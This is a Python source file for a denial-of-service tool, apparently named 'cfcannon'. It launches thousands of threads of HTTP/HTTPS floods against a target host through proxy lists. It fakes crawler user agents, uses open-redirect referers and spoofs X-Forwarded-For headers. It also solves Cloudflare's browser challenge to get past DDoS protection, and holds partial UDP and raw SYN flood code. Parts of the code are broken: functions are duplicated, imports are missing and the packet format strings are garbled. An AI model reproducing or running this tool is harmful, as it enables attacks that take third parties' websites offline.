import socket
import argparse
import ssl
import urllib.parse
import getopt
import os
import string
import _thread
import threading
import random
import time
import subprocess
import cfscrape
import sys
import struct
from colorama import *
from datetime import datetime
from threading import Thread, Event
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse

parser = argparse.ArgumentParser(description="cfcannon")
parser.add_argument('host', nargs="?", help="Host name, i.e: abc.com")
parser.add_argument('-d', '--dir', default="/", help="/index.php /register.php /login.php /register")
parser.add_argument('-s', '--ssl', dest="ssl",
                    action="store_false", help="Debug info, default on")
parser.add_argument('-p', '--port', default=80,
                    help="Port 80 or 443 ", type=int)
parser.add_argument('-t', '--threads', default=2000,
                    help="Number of threads", type=int)
parser.add_argument('-l', '--time', default=9999,
                    help="how long (seconds) the attack lasts", type=int)
parser.add_argument('-x', '--proxy_file_location', default="proxy.list",
                    help="proxy file location. if empty, use direct connection")
parser.add_argument('-Synflood',action='store_true',help='Enable synflood attack')
parser.add_argument('-Pyslow',action='store_true',help='Enable pyslow attack')
parser.add_argument('--fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')					
args = parser.parse_args()
request_list = []
#beamty edit 
proxy_file = 'proxy.list'
ua_file = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; YandexTurbo/1.0; +http://yandex.com/bots)",
"Google Crawler: Googlebot/2.1 (+http://www.google.com/bot.html)",
"OnPageBot (compatible; Googlebot 2.1; +https://bot.onpage.org/)",
"Googlebot/2.1 (+http://www.googlebot.com/bot.html) (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko BingPreview/1.0b",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
]
ref_file = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
"https://drive.google.com/viewerng/viewer?url=",
"https://developers.google.com/speed/pagespeed/insights/?url=",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.comicgeekspeak.com/proxy.php?url=",
"http://host-tracker.com/check_page/?furl=",
"http://validator.w3.org/check?uri=",
"http://www.google.com/translate?u=",
"http://translate.google.com/translate?u=",
"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
]

#edit bypass attack vps http by beamty hilo
ex = Event()
ips = []
ref = []
ua = []
timeout = -1
proto = ''

# arguments
url = ''
# if http auth
auth = False
auth_login = ''
auth_pass = ''
#<-------------beamtyty--------->
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
	"accept: text/plain, */*; q=0.01"
	"Accept: text/plain, */*; q=0.01"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
]
proxy_list = []
cf_token = []
global url
if args.ssl:
    url = "http://" + args.host
else:
    url = "https://" + args.host
#<------beamty-BYPASS------->
# Read proxy.list then append to proxy_list[]

def proxyget():
    proxy_file = open(args.proxy_file_location, "r")
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()
    proxy_file.close()
def parseFiles():
	#trying to find and parse file with proxies
	try:
		if os.stat(proxy_file).st_size > 0:
			with open(proxy_file) as proxy:
				global ips
				ips = [row.rstrip() for row in proxy]
		else: 
			print('Error: File %s is empty!' % proxy_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % proxy_file)
		sys.exit()
	#trying to find and parse file with User-Agents
	try:
		if os.stat(ua_file).st_size > 0:
			with open(ua_file) as user_agents:
				global ua
				ua = [row.rstrip() for row in user_agents]
		else:
			print('Error: File %s is empty' % ua_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % ua_file)
		sys.exit()
	#trying to find and parse file with referers
	try:
		if os.stat(ref_file).st_size > 0:
			with open(ref_file) as referers:
				global ref
				ref = [row.rstrip() for row in referers]
		else:
			print('Error: File %s is empty!' % ref_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % ref_file)
		sys.exit()
	#parse end
	# messaging statistics
	print('Loaded: {} proxies, {} user-agents, {} referers'.format(len(ips), len(ua), len(ref)))
	cloudFlareCheck()

def run():
	data = random._urandom(99, 9999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
		except:
			print("beamty ERR run randompaket")

	
def request(index):
	err_count = 0
	global url
	while not ex.is_set():
		timestamp = str(int(time.time()))
		headers = {'User-Agent': random.choice(ua),
			'Referer': random.choice(ref) + url,
			'Accept-Encoding': 'gzip;q=0,deflate,sdch',
			'Cache-Control': 'deflate, gzip;q=1.0, *;q=0.5',
			'Pragma': 'no-cache'}
		proxy = {proto: ips[index]}
		try:
			if auth:
				r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
			else:
				r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=timeout)
			if r.status_code == 301 or r.status_code == 302 or r.status_code == 307:
				url = r.headers['Location']
				print('Request was redirected to {}'.format(url))
		except requests.exceptions.ChunkedEncodingError:
			pass
		except requests.exceptions.ConnectionError:
			err_count += 1
		except requests.exceptions.ReadTimeout:
			pass
		if err_count >= 20:
			print("Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
			return	
	

def cloudFlareCheck():
	global url
	if isCloudFlare(url) is True:
		print("*** Your target is hidding behind CloudFlare! This attack may not entail any consequences to the victim's web-site.")
		time.sleep(10)
		for i in range(10, 0, -1):
			print('Your attack will be launched in ' + str(i) + ' seconds...', end='\r')
			time.sleep(10)
		startAttack()
	else:
		startAttack()
def isCloudFlare(link):
	#get origin IP by domain
	parsed_uri = urlparse(link)
	domain = '{uri.netloc}'.format(uri=parsed_uri)
	try:
		origin = socket.gethostbyname(domain)
		iprange = requests.get('https://www.cloudflare.com/ips-v4').text
		#get CloudFlare's IP range
		ipv4 = [row.rstrip() for row in iprange.splitlines()]
		#
		for i in range(len(ipv4)):
			if addressInNetwork(origin, ipv4[i]):
				return True
	except socket.gaierror:
		print("Unable to verify if victim's IP address belong to a CloudFlare's subnet")
		return		
		
def isCloudFlare(link):
	#get origin IP by domain
	parsed_uri = urlparse(link)
	domain = '{uri.netloc}'.format(uri=parsed_uri)
	try:
		origin = socket.gethostbyname(domain)
		iprange = requests.get('https://www.cloudflare.com/ips-v6').text
		#get CloudFlare's IP range
		ipv4 = [row.rstrip() for row in iprange.splitlines()]
		#
		for i in range(len(ipv4)):
			if addressInNetwork(origin, ipv4[i]):
				return True
	except socket.gaierror:
		print("Unable to verify if victim's IP address belong to a CloudFlare's subnet")
		return	
		

# Is target protected by Cloudflare?
def is_protected_by_cf():
    try:
        first_request = subprocess.check_output(
            ["curl", "-A", format(random.choice(ua_file)), args.host], timeout= -1)
        first_request = first_request.decode("ascii", errors="ignore")
        find_keyword = False
        for line in first_request.splitlines():
            if line.find("Checking your browser before accessing") != -1:
                find_keyword = False
    except Exception:
        return False
    return find_keyword
def set_request():
    global request
    get_host = "GET " + args.dir + " HTTP/1.0\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: " + random.choice(ua_file) + "\r\n"
	#Referer = random.choice(ref_file) #ref รอการแก้ไข
    accept = random.choice(acceptall)
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)
	#beamty HTTP - CF SCE 5
	
def set_request():
    global request
    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: " + random.choice(ua_file) + "\r\n"
	#Referer = random.choice(ref_file) #ref รอการแก้ไข
    accept = random.choice(acceptall)
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)
	#beamty HTTP - CF SCE 5

#<------beamty-BYPASS------->//
# set request for non cloud flare DDOS proction
def set_request():
    global request
    get_host = "GET " + args.dir + " HTTP/2.0\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: " + random.choice(ua_file) + "\r\n"
	#Referer = random.choice(ref_file) #ref รอการแก้ไข
    accept = random.choice(acceptall)
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)
	#beamty HTTP - CF SCE 5

def startAttack():
	threads = []
	for i in range(len(ips)):
		t = threading.Thread(target=request, args=(i,))
		t.daemon = True
		t.start()
		threads.append(t)
	try:
		while True:
			time.sleep(.05)
	except KeyboardInterrupt:
		ex.set()
		print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
		for t in threads:
			t.join()
            
            
 

# list = [proxy.ip#proxy.port#cftoken]
# Gerenarate cookies and useragent for cloud flare challenge page
def generate_cf_token(i):
    proxy = proxy_list[i].strip().split(":")
    proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
    # proxies = {"http": "http://"+proxy[0]+":"+proxy[1],"https": "https://"+proxy[0]+":"+proxy[1]}
    try:
        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
        tokens_string = "Cookie: " + cookie_value + "\r\n"
        user_agent_string = "User-Agent: " + user_agent + "\r\n"
        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + tokens_string + user_agent_string)
    except:
        pass
		
def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots

	def sending_packets(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count+=3
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt+=1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		return sock
		
def Building_packet(self):
		ihl=5
		version=4
		tos=1
		tot=40
		id=54321
		frag_off=1
		ttl=64
		protocol=IPPROTO_TCP
		check=10
		s_addr=inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BEAMTY HILO354a645dswq68w7eq6w54e',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = 54321
		dest = 80
		seq = 0
		ack_seq = 1
		doff = 5
		fin = 1
		syn = 1
		rst = 1
		ack = 1
		psh = 1
		urg = 1
		window = htons(5678)
		check = 1
		urg_prt = 1

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
		tcp_header=pack('!5BsdfEAMTYHILO3sdfs246sd4fw35e43wr4e85c41gsAS64',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!asw5BsdfEAMTYHILO3sdfasds246sd4fw35e43wr4e85c41gsAS64',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!5BsdfEAMTYHILO3sdfs246sd4fw35e43wr4e85c41gsAS64',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		return packet


# set request for cloud flare challenge page
def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET " + args.dir + " HTTP/2.0\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    '''
    print("ip: "+cf_combine[0]+"\n")
    print("port: "+cf_combine[1]+"\n")
    print("Cookie&UA: "+cf_combine[2]+"\n")
    '''
    accept = random.choice(acceptall)
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
			   

    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"


def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    '''
    print("ip: "+cf_combine[0]+"\n")
    print("port: "+cf_combine[1]+"\n")
    print("Cookie&UA: "+cf_combine[2]+"\n")
    '''
    accept = random.choice(acceptall)
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
			   

    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"


def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET " + args.dir + " HTTP/1.0\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    '''
    print("ip: "+cf_combine[0]+"\n")
    print("port: "+cf_combine[1]+"\n")
    print("Cookie&UA: "+cf_combine[2]+"\n")
    '''
    accept = random.choice(acceptall)
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
			   

    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"
def HTTP_GET(url,headers,keywords,charset='utf-8'):
    try:
        return_headers = StringIO.StringIO()
        return_body = StringIO.StringIO()

        private_headers = []

        for key in headers.keys():
            head = key + ': ' + headers[key]
            private_headers.append(head)

        c = pycurl.Curl()
        c.setopt(pycurl.URL, url)
        c.setopt(pycurl.SSL_VERIFYPEER, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 1)
        c.setopt(pycurl.HEADER, True)
        c.setopt(pycurl.HTTPHEADER, private_headers)
        c.setopt(pycurl.CONNECTTIMEOUT, 3)
        c.setopt(pycurl.FOLLOWLOCATION, False)
        c.setopt(pycurl.HEADERFUNCTION, return_headers.write)
        c.setopt(pycurl.WRITEFUNCTION, return_body.write)
        c.perform()

        return_headers = return_headers.getvalue()
        return_body = return_body.getvalue().decode(charset, 'ignore')

        if return_body.find(keywords) > -1 or return_headers.find(keywords) > -1:
            return True
        else:
            #print return_body
            return False
    except Exception as e:
        #print "error:",e
        return False

def getHeaders(url,is_protected_by_cf):
    global ready
    if is_protected_by_cf == True:
        data = BypassCF.get(url)

        if data == False:
            return data
 
        return {
            "Cookie":'__cfduid=%s;cf_clearance=%s;' % (data['cfduid'],data['cf_clearance']),
            'User-Agent':data['UA'],
            'Cache-Control':'no-cache',
            'Connection':'close',
            'Pragma':'no-cache',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
    else:
        return {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
            'Cache-Control': 'no-cache',
            'Connection': 'close',
            'Pragma': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
class CCAttack(threading.Thread):

    def __init__(self, url,counter,headers,keywords,charset,path):
        threading.Thread.__init__(self)
        self.counter = counter
        self.url = url+path+"&ccid="+str(counter)
        self.headers = headers
        self.keywords = keywords
        self.charset = charset

def cacl(jsfuck,id):
    if id == 1:
        fuck1 = jsfuck.split('/')[0]
        fuck1 = fuck1[2:len(fuck1)-1]

        fuck2 = jsfuck.split('/')[1]
        fuck2 = fuck2[2:len(fuck2) - 1]

        fuck1list = re.findall('\((.*?)\)',fuck1,re.S)
        fuck2list = re.findall('\((.*?)\)', fuck2, re.S)
        f1str = ''
        f2str = ''

        for f1 in fuck1list:
            f1str+=test(f1).replace('+','')
        for f2 in fuck2list:
            f2str+=test(f2).replace('+','')
        return "%.18f" % (float(f1str)/float(f2str))
def jschl_answer(data,domain):
    text = data.replace('!![]','1').replace('!+[]','1')#.replace('+[]','0')
    temp = re.findall('\{\"(.*?)\"\:\+\(\(',text,re.S)[0]
    first = '+(('+re.findall('\+\(\((.*?)\}\;',text,re.S)[0]
    rows = re.findall('\.'+temp+"(.*?)\=" + '(.*?)\;',text,re.S)

    a = ''
    a+=cacl(first,1)
    rows = rows[0:len(rows)-1]
    for row in rows:
        if row[0] == '*' or row[0] == '/':
            a = '(' + a + ')'
        a += row[0]
        a +=cacl(row[1],1)
    return round(float("%.14f" % eval(a)),10) + len(domain)

def retry_if_result_False(result):
    return result is False

def getToken(url):
    try:
        domain = url.replace('https://',"").replace("http://","").replace("/","")
        UA = (ua_file)
        stime = time.time()
        headers = StringIO.StringIO()
        body = StringIO.StringIO()
        c = pycurl.Curl()
        c.setopt(pycurl.URL,url)
        c.setopt(pycurl.FOLLOWLOCATION, 1)
        c.setopt(pycurl.SSL_VERIFYPEER, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 1)
        c.setopt(pycurl.CONNECTTIMEOUT, 5)
        c.setopt(pycurl.MAXREDIRS, 5)
        c.setopt(pycurl.USERAGENT,UA)
        c.setopt(pycurl.HEADERFUNCTION, headers.write)
        c.setopt(pycurl.WRITEFUNCTION, body.write)
        c.perform()
        headers = headers.getvalue()
        body = body.getvalue()
        inputtext = re.findall('<input type="hidden" name="(.*?)" value="(.*?)"/>',body,re.S)
        text_cfduidtext = re.findall('__cfduid=(.*?);',headers,re.S)[0]
        text_pass = inputtext[1][1]
        text_jschl_vc = inputtext[0][1]
        text_jschl_answer = jschl_answer(body,domain)
        time.sleep(4)

        urlx = url + "/cdn-cgi/l/chk_jschl?jschl_vc=%s&pass=%s&jschl_answer=%s" % (text_jschl_vc,text_pass,text_jschl_answer)
        header = [ "Cookie: __cfduid=" + text_cfduidtext]
        headers = StringIO.StringIO()
        body = StringIO.StringIO()
        c = pycurl.Curl()
        c.setopt(pycurl.URL,urlx)
        c.setopt(pycurl.FOLLOWLOCATION, 1)
        c.setopt(pycurl.SSL_VERIFYPEER, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 1)
        c.setopt(pycurl.HEADER, True)  # Extend headrs
        c.setopt(pycurl.HTTPHEADER, header)
        c.setopt(pycurl.CONNECTTIMEOUT, 3)
        c.setopt(pycurl.FOLLOWLOCATION, False)  # Redirect
        c.setopt(pycurl.USERAGENT,UA)
        c.setopt(pycurl.HEADERFUNCTION, headers.write)
        c.setopt(pycurl.WRITEFUNCTION, body.write)
        c.perform()
        headers = headers.getvalue()
        text_cf_clearance = re.findall('cf_clearance=(.*?);',headers,re.S)[0]
        return {
            'UA':UA,
            'cfduid':text_cfduidtext,
            'cf_clearance':text_cf_clearance,
            'usedtime':time.time()-stime
        }
    except:
        return False

def main():
    proxyget()
    global go
    global x
    x = 0
    go = threading.Event()
    if is_protected_by_cf():
        print ("\n---------------------------------------------------------------------")
        print ("Target: ", args.host, " is protected by Cloudfalre.")
        print (" BEAMTY HTTP | 2mins for bypass .   ")
        print ("---------------------------------------------------------------------")
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token, (i,))
        time.sleep(0)
        for x in range(args.threads):
            set_request_cf()
            # print (request_cf)
            RequestProxyHTTP(x + 1).start()
            print ("ATTACK----------------> |" + str(x) + " ready!")
        go.set()
    else:
        print ("\n---------------------------------------------------------------------")
        print ("Target: ", args.host, " is not protected by Cloudfalre.")
        print ("  BEAMTY | HTTP 5 seconds for UA Generation.   ")
        print ("---------------------------------------------------------------------")
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())
        time.sleep(0)
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
            print(Fore.YELLOW + "Ready |<-------------->| " + str(x) + " BEAMTY Ready!")
        go.set()
		
class RequestDefaultHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                # creazione socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(request))  # invio
                print(Fore.GREEN + "ATTACK <DDOS>----------->| ", self.counter,"----------->URL------->")
                try:
                    for y in range(600):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

class RequestDefaultHTTPS(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                # creazione socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
                                    ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(request))  # invio
                print(Fore.RED + "ATTACK <DDOS>----------->|", self.counter,"----------->URL------->")
                try:
                    for y in range(600):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

class RequestProxyHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try: 
                s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 17)
                s.connect((str(proxy_ip), int(proxy_port)))
                s.send(str.encode(request_cf))
                print ("Request sent from " +
                       str(proxy_ip + ":" + proxy_port) + " @", self.counter)
                try:
                    for y in range(300):
                        s.send(str.encode(request_cf))
                except:
                    pass
                    # s.close()
            except:
                pass
                # s.close()


if __name__ == "__main__":
    main()
dict = {}